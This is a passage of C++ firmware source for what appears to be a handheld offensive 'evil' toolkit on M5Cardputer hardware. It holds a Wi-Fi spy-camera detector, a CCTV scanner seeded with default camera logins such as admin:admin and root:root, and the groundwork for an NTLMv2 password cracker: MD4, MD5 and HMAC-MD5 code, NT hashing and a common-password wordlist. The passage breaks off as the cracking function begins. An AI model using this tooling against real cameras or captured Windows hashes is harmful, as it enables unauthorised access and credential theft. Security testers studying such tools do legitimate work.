const char* const HC_SPYCAM_OUI_LIST[] PROGMEM = {
  oui0, oui1, oui2, oui3, oui4, oui5, oui6, oui7,
  oui8, oui9, oui10, oui11, oui12, oui13, oui14, oui15, oui16, oui17,
  oui18, oui19, oui20, oui21,
  oui22, oui23, oui24
};


const uint8_t HC_SPYCAM_OUI_COUNT =
  sizeof(HC_SPYCAM_OUI_LIST) / sizeof(HC_SPYCAM_OUI_LIST[0]);
  
// Mots de passe par dÃ©faut
const char pwd0[] PROGMEM = "01234567";
const char pwd1[] PROGMEM = "12345678";
const char pwd2[] PROGMEM = "123456";
const char pwd3[] PROGMEM = "88888888";
const char pwd4[] PROGMEM = "12345678";

const char* const HC_DEFAULT_PWD_LIST[] PROGMEM = { pwd0, pwd1, pwd2, pwd3, pwd4 };
const uint8_t HC_DEFAULT_PWD_COUNT =
  sizeof(HC_DEFAULT_PWD_LIST) / sizeof(HC_DEFAULT_PWD_LIST[0]);

// Liste BLANCHE
const char atest0[] PROGMEM = "MATECAM_X1";
const char atest1[] PROGMEM = "WIFICAMERA";
const char atest2[] PROGMEM = "IPCAM";
const char atest3[] PROGMEM = "IPC-";
const char atest4[] PROGMEM = "PV-";
const char atest5[] PROGMEM = "HDCAM";
const char atest6[] PROGMEM = "HDWIFICAM";
const char atest7[] PROGMEM = "CAMP2P";
const char atest8[] PROGMEM = "P2P_";
const char atest9[] PROGMEM = "ICAM";
const char atest10[] PROGMEM = "NETCAM";
const char atest11[] PROGMEM = "GW_IPC";

const char* const HC_ALLOWED_TEST_SSIDS[] PROGMEM = {
  atest0, atest1, atest2, atest3, atest4, atest5,
  atest6, atest7, atest8, atest9, atest10, atest11
};
const uint8_t HC_ALLOWED_TEST_SSIDS_COUNT =
  sizeof(HC_ALLOWED_TEST_SSIDS) / sizeof(HC_ALLOWED_TEST_SSIDS[0]);

// =========================
// 2) ETAT
// =========================
const unsigned long WIFI_SCAN_PERIOD_MS = 1500;
const unsigned long UI_REFRESH_MS       = 300;
const int RSSI_ALERT_THRESHOLD          = -40;

bool spycamScanningHC = false;
unsigned long lastWifiScanHC = 0;
unsigned long lastUiHC = 0;

char msgBuf[512];
char tmpA[48];
char tmpB[48];

// =========================
// 3) OUTILS
// =========================
void pgmReadString(const char* p, char* out, size_t outLen) {
  strncpy_P(out, p, outLen - 1);
  out[outLen - 1] = '\0';
}
bool pgmStringStartsWith(const char* p, const char* up) {
  pgmReadString(p, tmpA, sizeof(tmpA));
  size_t L = strlen(tmpA);
  return strncmp(up, tmpA, L) == 0;
}
void toUpperTrim(char* s) {
  while (*s==' '||*s=='\t'||*s=='\r'||*s=='\n') memmove(s, s+1, strlen(s));
  size_t L = strlen(s);
  while (L && (s[L-1]==' '||s[L-1]=='\t'||s[L-1]=='\r'||s[L-1]=='\n')) { s[L-1]='\0'; L--; }
  for (size_t i=0;i<L;i++) s[i] = toupper((unsigned char)s[i]);
}
void bssidToStrHC(const uint8_t* b, char* out, size_t outLen) {
  snprintf(out, outLen, "%02X:%02X:%02X:%02X:%02X:%02X", b[0],b[1],b[2],b[3],b[4],b[5]);
}
void ouiFromBssidHC(const char* bssid, char* oui, size_t outLen) {
  snprintf(oui, outLen, "%.8s", bssid);
}
bool looksLikeFdigits(const char* up) {
  size_t L = strlen(up);
  if (L < 4) return false;
  if (up[0] != 'F') return false;
  for (size_t i=1;i<L;i++) if (!isdigit((unsigned char)up[i])) return false;
  return true;
}
bool looksLikeA9Style(const char* up) {
  size_t L = strlen(up);
  if (L < 6 || L > 12) return false;
  for (size_t i=0;i<L;i++) {
    char c = up[i];
    if (!((c>='0'&&c<='9')||(c>='A'&&c<='Z'))) return false;
  }
  for (uint8_t i=0;i<HC_SPYCAM_SSID_COUNT;i++) {
    const char* p = (const char*)pgm_read_ptr(&HC_SPYCAM_SSID_LIST[i]);
    if (pgmStringStartsWith(p, up)) return false;
  }
  if (looksLikeFdigits(up)) return false;
  return true;
}
const char* authToTextHC(wifi_auth_mode_t m) {
  switch (m) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA-PSK";
    case WIFI_AUTH_WPA2_PSK: return "WPA2-PSK";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
    case WIFI_AUTH_WPA3_PSK: return "WPA3-PSK";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/WPA3";
    default: return "UNK";
  }
}
void drawSpycamScreenHC(const char* text, bool alert) {
  M5.Display.fillScreen(TFT_BLACK);
  M5.Display.setTextSize(1.5);
  M5.Display.setCursor(5,0);
  M5.Display.setTextColor(alert ? TFT_RED : menuTextUnFocusedColor);
  M5.Display.println(text);
  if (alert) {
    M5.Speaker.tone(1200, 220);
    pixels.setPixelColor(0, pixels.Color(255, 0, 0)); pixels.show();
    delay(60);
    pixels.setPixelColor(0, pixels.Color(0, 0, 0)); pixels.show();
  }
}

// =========================
// 4) DETECTION
// =========================
bool isSpyBySSIDHC(const char* ssid, char* reasonOut, size_t reasonLen) {
  strncpy(tmpB, ssid && ssid[0] ? ssid : "<hidden>", sizeof(tmpB)-1);
  tmpB[sizeof(tmpB)-1]='\0';
  toUpperTrim(tmpB);

  for (uint8_t i=0;i<HC_SPYCAM_SSID_COUNT;i++) {
    const char* p = (const char*)pgm_read_ptr(&HC_SPYCAM_SSID_LIST[i]);
    if (pgmStringStartsWith(p, tmpB)) {
      strncpy(reasonOut, "SSID_MATCH", reasonLen-1); reasonOut[reasonLen-1]='\0';
      return true;
    }
  }
  if (looksLikeFdigits(tmpB)) {
    strncpy(reasonOut, "Fxxxxx", reasonLen-1); reasonOut[reasonLen-1]='\0';
    return true;
  }
  if (looksLikeA9Style(tmpB)) {
    strncpy(reasonOut, "A9_STYLE", reasonLen-1); reasonOut[reasonLen-1]='\0';
    return true;
  }
  strncpy(reasonOut, "NONE", reasonLen-1); reasonOut[reasonLen-1]='\0';
  return false;
}
bool isSpyByOUIHC(const char* oui, char* reasonOut, size_t reasonLen) {
  strncpy(tmpB, oui, sizeof(tmpB)-1); tmpB[sizeof(tmpB)-1]='\0';
  toUpperTrim(tmpB);
  for (uint8_t i=0;i<HC_SPYCAM_OUI_COUNT;i++) {
    const char* p = (const char*)pgm_read_ptr(&HC_SPYCAM_OUI_LIST[i]);
    pgmReadString(p, tmpA, sizeof(tmpA));
    if (strcmp(tmpB, tmpA) == 0) {
      strncpy(reasonOut, "OUI_MATCH", reasonLen-1); reasonOut[reasonLen-1]='\0';
      return true;
    }
  }
  return false;
}

// =========================
// 5) FONCTION PRINCIPALE
// =========================
void scanCCTV_SpyDectection() {
  M5.Display.fillScreen(menuBackgroundColor);
  M5.Display.setTextSize(1.5);
  M5.Display.setTextColor(menuTextUnFocusedColor);
  M5.Display.setCursor(5, 5);
  M5.Display.println("SpyCam Scan (HC)...");
  M5.Display.setTextSize(1.5);
  M5.Display.println("ENTER/BACK: exit");
  M5.Display.display();

  spycamScanningHC = true;
  lastWifiScanHC = 0; lastUiHC = 0;
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  enterDebounce();

  while (spycamScanningHC) {
    M5.update(); M5Cardputer.update();

    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) ||
        M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      spycamScanningHC = false; break;
    }

    unsigned long now = millis();
    if (now - lastWifiScanHC >= WIFI_SCAN_PERIOD_MS) {
      lastWifiScanHC = now;
      int n = WiFi.scanNetworks(false, true);

      if (n > 0) {
        for (int i = 0; i < n; i++) {
          String ss = WiFi.SSID(i);
          const char* ssidC = ss.length() ? ss.c_str() : "<hidden>";
          int32_t rssi = WiFi.RSSI(i);
          uint8_t* bssidp = WiFi.BSSID(i);
          char bssidStr[18]; bssidToStrHC(bssidp, bssidStr, sizeof(bssidStr));
          int32_t ch = WiFi.channel(i);
          wifi_auth_mode_t auth = (wifi_auth_mode_t)WiFi.encryptionType(i);

          char reasonSSID[16]; reasonSSID[0]='\0';
          bool suspectSSID = isSpyBySSIDHC(ssidC, reasonSSID, sizeof(reasonSSID));
          char oui[9]; ouiFromBssidHC(bssidStr, oui, sizeof(oui));
          char reasonOUI[16]; reasonOUI[0]='\0';
          bool matchOUI = isSpyByOUIHC(oui, reasonOUI, sizeof(reasonOUI));
          bool strong = (rssi >= RSSI_ALERT_THRESHOLD);

          bool isRealSuspect = (suspectSSID && matchOUI);

          snprintf(msgBuf, sizeof(msgBuf),
                   "Scanning for SpyCam\n"
                   "__________________________\n"
                   "SSID: %.28s\n"
                   "BSSID: %s\n"
                   "CH:%d  RSSI:%ddBm\n"
                   "AUTH: %s\n"
                   "SpyCam: %s [%s/%s]\n"
                   "__________________________\n"
                   "Bip when SpyCam detected",
                   ssidC,
                   bssidStr,
                   ch, (int)rssi,
                   authToTextHC(auth),
                   isRealSuspect ? (strong ? "Probable (NEAR)" : "Probable") : "No",
                   reasonSSID, reasonOUI);

          drawSpycamScreenHC(msgBuf, isRealSuspect);
        }
      }
    }
    delay(20);
  }

  M5.Display.fillScreen(menuBackgroundColor);
  M5.Display.setTextSize(1.5);
  M5.Display.setCursor(5, M5.Display.height()/2);
  M5.Display.println("Stopping SpyCam scan...");
  M5.Display.display();
  delay(700);
  waitAndReturnToMenu("Return to menu");
}



void scanCCTVCameras() {
  if (WiFi.localIP().toString() == "0.0.0.0") {
    M5.Display.fillScreen(menuBackgroundColor);
    M5.Display.setTextSize(1.5);
    M5.Display.setCursor(5, M5.Display.height()/2);
    M5.Display.println("Not connected...");
    M5.Display.println("Only SpyCam detector");
    M5.Display.display();
    delay(1000);
  }

  // --- Ensure /evil/CCTV directory exists ---
  if (SD.exists("/evil/CCTV")) {
    File d = SD.open("/evil/CCTV");
    bool isDir = d && d.isDirectory();
    if (d) d.close();
    if (!isDir) {
      waitAndReturnToMenu("SD error: /evil/CCTV exists but is not a directory");
      return;
    }
  } else {
    if (!SD.mkdir("/evil/CCTV")) {
      waitAndReturnToMenu("SD error: cannot create /evil/CCTV");
      return;
    }
  }

  // --- Ensure /evil/CCTV/CCTV_IP.txt exists ---
  if (!SD.exists(CCTV_FILE)) {
    File f = SD.open(CCTV_FILE, FILE_WRITE);
    if (!f) {
      waitAndReturnToMenu("SD error: cannot create CCTV_IP.txt");
      return;
    }
    f.println("# List of CCTV IP addresses");
    f.println("# one IP per line, e.g.:");
    f.println("# 192.168.1.10");
    f.close();
  }

  // --- Ensure /evil/CCTV/credentials.txt exists ---
  if (!SD.exists(CREDS_FILE)) {
    File cf = SD.open(CREDS_FILE, FILE_WRITE);
    if (!cf) {
      waitAndReturnToMenu("SD error: cannot create credentials.txt");
      return;
    }
    cf.println("# one per line: user:pass");
    cf.println("admin:admin");
    cf.println("user:user");
    cf.println("root:root");
    cf.close();
  }

  // ========= Menu parent en boucle =========
  for (;;) {
    // 0 = local, 1 = ip unique, 2 = from file, 3 = viewer, -1 = cancel/back (retour menu principal)
    int sel = chooseScanModeMenu();

    if (sel < 0) {
      // BACKSPACE / Cancel dans le menu scan => retour au menu principal
      waitAndReturnToMenu("Back To Main Menu");
      return;
    }

    // Dispatch : chaque sous-fonction revient ici quand elle se termine
    if      (sel == 0) scanCCTVCamerasLocal();
    else if (sel == 1) scanCCTVCamerasSingleIP();
    else if (sel == 2) scanCCTVCamerasFromFile();
    else if (sel == 3) runCCTV_MJPEGViewer();
    else if (sel == 4) scanCCTV_SpyDectection();backDebounce();
  }
} 



/*
============================================================================================================================
Crack NTLMv2
============================================================================================================================
*/



#define ROL(x,n) ( (uint32_t)((uint32_t)(x) << (n)) | (uint32_t)((uint32_t)(x) >> (32-(n))) )
#define F1(x,y,z) (((x)&(y)) | ((~x)&(z)))
#define G(x,y,z) (((x)&(y)) | ((x)&(z)) | ((y)&(z)))
#define H(x,y,z) ((x) ^ (y) ^ (z))

void MD4_Encode(uint8_t *output, const uint32_t *input, size_t len) {
  for (size_t i=0,j=0; j<len; i++, j+=4) {
    output[j]   = (uint8_t)( input[i]        & 0xff);
    output[j+1] = (uint8_t)((input[i] >> 8)  & 0xff);
    output[j+2] = (uint8_t)((input[i] >> 16) & 0xff);
    output[j+3] = (uint8_t)((input[i] >> 24) & 0xff);
  }
}

void MD4_Transform(uint32_t state[4], const uint8_t block[64]) {
  uint32_t a=state[0], b=state[1], c=state[2], d=state[3], X[16];
  for (int i=0,j=0; j<64; i++, j+=4)
    X[i] = (uint32_t)block[j] | ((uint32_t)block[j+1]<<8) |
           ((uint32_t)block[j+2]<<16) | ((uint32_t)block[j+3]<<24);

  #define ROUND1(a,b,c,d,k,s) a = ROL(a + F1(b,c,d) + X[k], s)
  #define ROUND2(a,b,c,d,k,s) a = ROL(a + G(b,c,d) + X[k] + 0x5a827999, s)
  #define ROUND3(a,b,c,d,k,s) a = ROL(a + H(b,c,d) + X[k] + 0x6ed9eba1, s)

  ROUND1(a,b,c,d, 0, 3);  ROUND1(d,a,b,c, 1, 7);  ROUND1(c,d,a,b, 2,11);  ROUND1(b,c,d,a, 3,19);
  ROUND1(a,b,c,d, 4, 3);  ROUND1(d,a,b,c, 5, 7);  ROUND1(c,d,a,b, 6,11);  ROUND1(b,c,d,a, 7,19);
  ROUND1(a,b,c,d, 8, 3);  ROUND1(d,a,b,c, 9, 7);  ROUND1(c,d,a,b,10,11);  ROUND1(b,c,d,a,11,19);
  ROUND1(a,b,c,d,12, 3);  ROUND1(d,a,b,c,13, 7);  ROUND1(c,d,a,b,14,11);  ROUND1(b,c,d,a,15,19);

  ROUND2(a,b,c,d, 0, 3);  ROUND2(d,a,b,c, 4, 5);  ROUND2(c,d,a,b, 8, 9);  ROUND2(b,c,d,a,12,13);
  ROUND2(a,b,c,d, 1, 3);  ROUND2(d,a,b,c, 5, 5);  ROUND2(c,d,a,b, 9, 9);  ROUND2(b,c,d,a,13,13);
  ROUND2(a,b,c,d, 2, 3);  ROUND2(d,a,b,c, 6, 5);  ROUND2(c,d,a,b,10, 9);  ROUND2(b,c,d,a,14,13);
  ROUND2(a,b,c,d, 3, 3);  ROUND2(d,a,b,c, 7, 5);  ROUND2(c,d,a,b,11, 9);  ROUND2(b,c,d,a,15,13);

  ROUND3(a,b,c,d, 0, 3);  ROUND3(d,a,b,c, 8, 9);  ROUND3(c,d,a,b, 4,11);  ROUND3(b,c,d,a,12,15);
  ROUND3(a,b,c,d, 2, 3);  ROUND3(d,a,b,c,10, 9);  ROUND3(c,d,a,b, 6,11);  ROUND3(b,c,d,a,14,15);
  ROUND3(a,b,c,d, 1, 3);  ROUND3(d,a,b,c, 9, 9);  ROUND3(c,d,a,b, 5,11);  ROUND3(b,c,d,a,13,15);
  ROUND3(a,b,c,d, 3, 3);  ROUND3(d,a,b,c,11, 9);  ROUND3(c,d,a,b, 7,11);  ROUND3(b,c,d,a,15,15);

  state[0]+=a; state[1]+=b; state[2]+=c; state[3]+=d;
}

void MD4_Init(MD4_CTX *ctx) {
  ctx->count[0] = ctx->count[1] = 0;
  ctx->state[0] = 0x67452301;
  ctx->state[1] = 0xefcdab89;
  ctx->state[2] = 0x98badcfe;
  ctx->state[3] = 0x10325476;
}

void MD4_Update(MD4_CTX *ctx, const uint8_t *input, size_t len) {
  size_t i, idx, partLen;
  idx = (ctx->count[0] >> 3) & 0x3F;
  if ((ctx->count[0] += ((uint32_t)len << 3)) < ((uint32_t)len << 3))
    ctx->count[1]++;
  ctx->count[1] += ((uint32_t)len >> 29);
  partLen = 64 - idx;
  if (len >= partLen) {
    memcpy(&ctx->buffer[idx], input, partLen);
    MD4_Transform(ctx->state, ctx->buffer);
    for (i = partLen; i + 63 < len; i += 64)
      MD4_Transform(ctx->state, &input[i]);
    idx = 0;
  } else i = 0;
  memcpy(&ctx->buffer[idx], &input[i], len - i);
}

void MD4_Final(uint8_t digest[16], MD4_CTX *ctx) {
  uint8_t bits[8];
  MD4_Encode(bits, ctx->count, 8);
  size_t idx = (ctx->count[0] >> 3) & 0x3f;
  size_t padLen = (idx < 56) ? (56 - idx) : (120 - idx);
  static uint8_t PADDING[64] = { 0x80 };
  MD4_Update(ctx, PADDING, padLen);
  MD4_Update(ctx, bits, 8);
  MD4_Encode(digest, ctx->state, 16);
} 

// =======================
// NT hash (UTF16-LE + MD4)
// =======================
void ntlmHash(const char *password, uint8_t out[16]) {
  size_t len = strlen(password);
  size_t ulen = len * 2;
  uint8_t buf[ulen];  // stack allocation
  for (size_t i=0; i<len; i++) {
    buf[2*i]   = (uint8_t)password[i];
    buf[2*i+1] = 0x00;
  }
  MD4_CTX ctx;
  MD4_Init(&ctx);
  MD4_Update(&ctx, buf, ulen);
  MD4_Final(out, &ctx);
}


/* =========================
 *  MD5 ultra-lÃ©ger (ESP32)
 * ========================= */

inline uint32_t ROTL32(uint32_t x, uint8_t n) { return (x << n) | (x >> (32 - n)); }

#define Ff(x,y,z) ((x & y) | (~x & z))
#define Gg(x,y,z) ((x & z) | (y & ~z))
#define Hh(x,y,z) (x ^ y ^ z)
#define Ii(x,y,z) (y ^ (x | ~z))

#define FF(a,b,c,d,x,s,ac) { a += Ff(b,c,d) + (x) + (uint32_t)(ac); a = ROTL32(a, s); a += b; }
#define GG(a,b,c,d,x,s,ac) { a += Gg(b,c,d) + (x) + (uint32_t)(ac); a = ROTL32(a, s); a += b; }
#define HH(a,b,c,d,x,s,ac) { a += Hh(b,c,d) + (x) + (uint32_t)(ac); a = ROTL32(a, s); a += b; }
#define II(a,b,c,d,x,s,ac) { a += Ii(b,c,d) + (x) + (uint32_t)(ac); a = ROTL32(a, s); a += b; }

void md5u_init(MD5U_CTX *ctx) {
  ctx->count[0] = ctx->count[1] = 0;
  ctx->state[0] = 0x67452301;
  ctx->state[1] = 0xEFCDAB89;
  ctx->state[2] = 0x98BADCFE;
  ctx->state[3] = 0x10325476;
}

void md5u_encode(uint8_t *out, const uint32_t *in, size_t len) {
  for (size_t i = 0, j = 0; j < len; i++, j += 4) {
    out[j]   = (uint8_t)( in[i]        & 0xFF);
    out[j+1] = (uint8_t)((in[i] >>  8) & 0xFF);
    out[j+2] = (uint8_t)((in[i] >> 16) & 0xFF);
    out[j+3] = (uint8_t)((in[i] >> 24) & 0xFF);
  }
}

void md5u_decode(uint32_t *out, const uint8_t *in, size_t len) {
  for (size_t i = 0, j = 0; j < len; i++, j += 4) {
    out[i] =  (uint32_t)in[j]
            | ((uint32_t)in[j+1] << 8)
            | ((uint32_t)in[j+2] << 16)
            | ((uint32_t)in[j+3] << 24);
  }
}

IRAM_ATTR void md5u_transform(uint32_t state[4], const uint8_t block[64]) {
  uint32_t a = state[0], b = state[1], c = state[2], d = state[3], x[16];
  md5u_decode(x, block, 64);

  // Round 1
  FF(a,b,c,d, x[ 0],  7, 0xd76aa478); FF(d,a,b,c, x[ 1], 12, 0xe8c7b756);
  FF(c,d,a,b, x[ 2], 17, 0x242070db); FF(b,c,d,a, x[ 3], 22, 0xc1bdceee);
  FF(a,b,c,d, x[ 4],  7, 0xf57c0faf); FF(d,a,b,c, x[ 5], 12, 0x4787c62a);
  FF(c,d,a,b, x[ 6], 17, 0xa8304613); FF(b,c,d,a, x[ 7], 22, 0xfd469501);
  FF(a,b,c,d, x[ 8],  7, 0x698098d8); FF(d,a,b,c, x[ 9], 12, 0x8b44f7af);
  FF(c,d,a,b, x[10], 17, 0xffff5bb1); FF(b,c,d,a, x[11], 22, 0x895cd7be);
  FF(a,b,c,d, x[12],  7, 0x6b901122); FF(d,a,b,c, x[13], 12, 0xfd987193);
  FF(c,d,a,b, x[14], 17, 0xa679438e); FF(b,c,d,a, x[15], 22, 0x49b40821);

  // Round 2
  GG(a,b,c,d, x[ 1],  5, 0xf61e2562); GG(d,a,b,c, x[ 6],  9, 0xc040b340);
  GG(c,d,a,b, x[11], 14, 0x265e5a51); GG(b,c,d,a, x[ 0], 20, 0xe9b6c7aa);
  GG(a,b,c,d, x[ 5],  5, 0xd62f105d); GG(d,a,b,c, x[10], 9, 0x02441453);
  GG(c,d,a,b, x[15], 14, 0xd8a1e681); GG(b,c,d,a, x[ 4], 20, 0xe7d3fbc8);
  GG(a,b,c,d, x[ 9],  5, 0x21e1cde6); GG(d,a,b,c, x[14], 9, 0xc33707d6);
  GG(c,d,a,b, x[ 3], 14, 0xf4d50d87); GG(b,c,d,a, x[ 8], 20, 0x455a14ed);
  GG(a,b,c,d, x[13],  5, 0xa9e3e905); GG(d,a,b,c, x[ 2],  9, 0xfcefa3f8);
  GG(c,d,a,b, x[ 7], 14, 0x676f02d9); GG(b,c,d,a, x[12], 20, 0x8d2a4c8a);

  // Round 3
  HH(a,b,c,d, x[ 5],  4, 0xfffa3942); HH(d,a,b,c, x[ 8], 11, 0x8771f681);
  HH(c,d,a,b, x[11], 16, 0x6d9d6122); HH(b,c,d,a, x[14], 23, 0xfde5380c);
  HH(a,b,c,d, x[ 1],  4, 0xa4beea44); HH(d,a,b,c, x[ 4], 11, 0x4bdecfa9);
  HH(c,d,a,b, x[ 7], 16, 0xf6bb4b60); HH(b,c,d,a, x[10], 23, 0xbebfbc70);
  HH(a,b,c,d, x[13],  4, 0x289b7ec6); HH(d,a,b,c, x[ 0], 11, 0xeaa127fa);
  HH(c,d,a,b, x[ 3], 16, 0xd4ef3085); HH(b,c,d,a, x[ 6], 23, 0x04881d05);
  HH(a,b,c,d, x[ 9],  4, 0xd9d4d039); HH(d,a,b,c, x[12], 11, 0xe6db99e5);
  HH(c,d,a,b, x[15], 16, 0x1fa27cf8); HH(b,c,d,a, x[ 2], 23, 0xc4ac5665);

  // Round 4
  II(a,b,c,d, x[ 0],  6, 0xf4292244); II(d,a,b,c, x[ 7], 10, 0x432aff97);
  II(c,d,a,b, x[14], 15, 0xab9423a7); II(b,c,d,a, x[ 5], 21, 0xfc93a039);
  II(a,b,c,d, x[12],  6, 0x655b59c3); II(d,a,b,c, x[ 3], 10, 0x8f0ccc92);
  II(c,d,a,b, x[10], 15, 0xffeff47d); II(b,c,d,a, x[ 1], 21, 0x85845dd1);
  II(a,b,c,d, x[ 8],  6, 0x6fa87e4f); II(d,a,b,c, x[15], 10, 0xfe2ce6e0);
  II(c,d,a,b, x[ 6], 15, 0xa3014314); II(b,c,d,a, x[13], 21, 0x4e0811a1);
  II(a,b,c,d, x[ 4],  6, 0xf7537e82); II(d,a,b,c, x[11], 10, 0xbd3af235);
  II(c,d,a,b, x[ 2], 15, 0x2ad7d2bb); II(b,c,d,a, x[ 9], 21, 0xeb86d391);

  state[0] += a; state[1] += b; state[2] += c; state[3] += d;
}

void md5u_update(MD5U_CTX *ctx, const uint8_t *input, size_t len) {
  uint32_t i = 0, idx = (ctx->count[0] >> 3) & 0x3F;
  ctx->count[0] += (uint32_t)len << 3;
  if (ctx->count[0] < ((uint32_t)len << 3)) ctx->count[1]++;
  ctx->count[1] += (uint32_t)len >> 29;

  uint32_t partLen = 64 - idx;
  if (len >= partLen) {
    memcpy(&ctx->buffer[idx], input, partLen);
    md5u_transform(ctx->state, ctx->buffer);
    for (i = partLen; i + 63 < len; i += 64) md5u_transform(ctx->state, &input[i]);
    idx = 0;
  } else {
    i = 0;
  }
  memcpy(&ctx->buffer[idx], &input[i], len - i);
}

void md5u_final(uint8_t digest[16], MD5U_CTX *ctx) {
  static const uint8_t PADDING[64] = { 0x80 };
  uint8_t bits[8];
  md5u_encode(bits, ctx->count, 8);

  uint32_t idx = (ctx->count[0] >> 3) & 0x3F;
  uint32_t padLen = (idx < 56) ? (56 - idx) : (120 - idx);
  md5u_update(ctx, PADDING, padLen);
  md5u_update(ctx, bits, 8);
  md5u_encode(digest, ctx->state, 16);
}

/* =========================
 *  HMAC-MD5 optimisÃ©
 * ========================= */

bool fastHMAC_MD5(const uint8_t *key, size_t keylen,
                  const uint8_t *msg, size_t msglen,
                  uint8_t out[16]) {
  uint8_t k_ipad[64], k_opad[64];
  uint8_t khash[16];

  // 1) Si key > 64, key = MD5(key)
  const uint8_t* k = key;
  size_t klen = keylen;
  if (keylen > 64) {
    MD5U_CTX ck; md5u_init(&ck);
    md5u_update(&ck, key, keylen);
    md5u_final(khash, &ck);
    k = khash; klen = 16;
  }

  // 2) PrÃ©pare ipad/opad (64 octets fixes)
  memset(k_ipad, 0x36, 64);
  memset(k_opad, 0x5c, 64);
  for (size_t i=0; i<klen; ++i) {
    k_ipad[i] ^= k[i];
    k_opad[i] ^= k[i];
  }

  // 3) inner = MD5( (k^ipad) || msg )
  uint8_t inner[16];
  MD5U_CTX c;
  md5u_init(&c);
  md5u_update(&c, k_ipad, 64);
  md5u_update(&c, msg, msglen);
  md5u_final(inner, &c);

  // 4) outer = MD5( (k^opad) || inner )
  md5u_init(&c);
  md5u_update(&c, k_opad, 64);
  md5u_update(&c, inner, 16);
  md5u_final(out, &c);

  return true;
}

// =======================
// Utils
// =======================
String toUpperCase(const String &s) { String out = s; out.toUpperCase(); return out; }

uint8_t hx(char c){ if(c>='0'&&c<='9')return c-'0'; c|=0x20; return 10+(c-'a'); }
void hexToBytes(const String &hex, uint8_t *out, size_t len){
  for(size_t i=0;i<len;i++) out[i]=(hx(hex[2*i])<<4)|hx(hex[2*i+1]);
}

bool hmacMD5(const uint8_t *key, size_t keylen,
             const uint8_t *msg, size_t msglen,
             uint8_t out[16]) {
  const mbedtls_md_info_t *info = mbedtls_md_info_from_type(MBEDTLS_MD_MD5);
  if(!info) return false;
  int r = mbedtls_md_hmac(info, key, keylen, msg, msglen, out);
  return (r==0);
}

void toUTF16LE(const String &s, uint8_t **buf, size_t *outLen){
  *outLen = s.length()*2;
  *buf = (uint8_t*)malloc(*outLen);
  for(size_t i=0;i<s.length();++i){
    (*buf)[2*i]=(uint8_t)s[i]; (*buf)[2*i+1]=0x00;
  }
}

void dumpHex(const char *label, const uint8_t *buf, size_t len) {
  Serial.print(label);
  for(size_t i=0;i<len;i++) {
    if (buf[i] < 0x10) Serial.print("0");
    Serial.print(buf[i], HEX);
  }
  Serial.println();
}

// =======================
// Feedback NTLM structurÃ©
// =======================
void drawNTLMInitUser(const String &user) {
  // Efface tout l'Ã©cran
  M5.Display.fillScreen(TFT_BLACK);
  M5.Display.setTextSize(1.5);
  M5.Display.setTextFont(1);
  M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
  M5.Display.setCursor(5, 20);

  // Affiche le nom utilisateur en cours
  String shortUser = user;
  if (shortUser.length() > 36) {
    shortUser = shortUser.substring(0, 33) + "...";
  }
  M5.Display.println("User: " + shortUser);

  // RÃ©serve la ligne suivante pour compteur
  M5.Display.setCursor(5, 40);
  M5.Display.println("Tried: 0");
}

void drawNTLMTries(uint32_t tried) {
  // Met Ã  jour uniquement la ligne "Tried"
  M5.Display.fillRect(0, 40, 240, 12, TFT_BLACK);
  M5.Display.setTextSize(1.5);
  M5.Display.setTextFont(1);
  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
  M5.Display.setCursor(5, 40);
  M5.Display.print("Tried: ");
  M5.Display.println(tried);
}

void drawNTLMResult(const String &msg, bool success = false) {
  // RÃ©sultat final pour cet utilisateur
  int y = 75; // â†“ descendu pour ne pas chevaucher le H/s

  M5.Display.fillRect(0, y, 240, 12, TFT_BLACK);
  M5.Display.setTextSize(1.5);
  M5.Display.setTextFont(1);
  M5.Display.setTextColor(success ? TFT_GREEN : TFT_RED, TFT_BLACK);
  M5.Display.setCursor(5, y);

  String shortMsg = msg;
  M5.Display.println(shortMsg);

  Serial.println(msg);
}



void ensureFilesExist() {
  if (!SD.exists("/evil")) {
    SD.mkdir("/evil");
    Serial.println("[INFO] Created /evil directory");
  }

  if (!SD.exists("/evil/NTLM/ntlm_hashes.txt")) {
    File nf = SD.open("/evil/NTLM/ntlm_hashes.txt", FILE_WRITE);
    if (nf) {
      Serial.println("[INFO] Created empty /evil/NTLM/ntlm_hashes.txt");
      nf.close();
    } else {
      Serial.println("[ERROR] Failed to create /evil/NTLM/ntlm_hashes.txt");
    }
  }

  if (!SD.exists("/evil/NTLM/ntlm_wordlist.txt")) {
    File wf = SD.open("/evil/NTLM/ntlm_wordlist.txt", FILE_WRITE);
    if (wf) {
      wf.println("admin");
      wf.println("root");
      wf.println("123456");
      wf.println("qwerty");
      wf.println("secret");
      wf.println("password");
      wf.println("qwerty123");
      wf.println("iloveyou");
      wf.println("654321");
      wf.println("a123456");
      wf.close();
      Serial.println("[INFO] Created default /evil/NTLM/ntlm_wordlist.txt");
    } else {
      Serial.println("[ERROR] Failed to create /evil/NTLM/ntlm_wordlist.txt");
    }
  }
}

void drawProgressBar(uint32_t current, uint32_t total) {
  if (total == 0) return;
  int barWidth = 240;   // largeur max de la barre
  int barHeight = 8;    // hauteur (fine pour Ã©conomiser la place)
  int x = 0;           // position X sur lâ€™Ã©cran
  int y = 120;          // position Y bas Ã©cran
  int filled = (int)((current * barWidth) / total);

  // fond noir
  M5.Display.fillRect(x, y, barWidth, barHeight, TFT_BLACK);

  // partie remplie en vert
  M5.Display.fillRect(x, y, filled, barHeight, TFT_GREEN);
  M5.Display.drawRect(x, y, barWidth, barHeight, TFT_WHITE);
}

void drawHashrate(uint32_t hps) {
  // Met Ã  jour uniquement la ligne Hash/s
  M5.Display.fillRect(0, 55, 240, 12, TFT_BLACK);
  M5.Display.setTextSize(1.5);
  M5.Display.setTextFont(1);
  M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
  M5.Display.setCursor(5, 55);
  M5.Display.print("Speed: ");
  M5.Display.print(hps);
  M5.Display.println(" H/s");
}

// =======================
// Crack NTLMv2
// =======================
void crackNTLMv2() {
  ensureFilesExist();

  File hf = SD.open("/evil/NTLM/ntlm_hashes.txt", FILE_READ);
  if (!hf) {
